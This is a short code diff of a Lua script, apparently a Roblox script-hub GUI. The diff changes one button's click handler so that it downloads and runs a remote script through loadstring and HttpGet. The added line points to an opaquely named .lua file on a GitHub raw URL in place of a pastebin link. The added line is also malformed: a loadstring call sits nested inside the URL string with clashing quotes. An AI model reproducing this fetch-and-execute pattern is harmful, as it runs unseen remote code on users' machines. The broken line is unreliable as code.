@@ -138,7 +138,7 @@ Fr.Font = Enum.Font.Montserrat
 Fr.Parent = Image
 Fr.TextSize = 21
 Fr.MouseButton1Click:Connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/AGRcUvPm"))("Copyright ERROR_CODE ECCS Co")
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/gitluau/luauexser/refs/heads/main/pHzp8uG1PO962o6qucrlP3AJy17eV3B.lua"))()"))("Copyright ERROR_CODE ECCS Co")
 end)
 
 local F6 = Instance.new("TextButton")
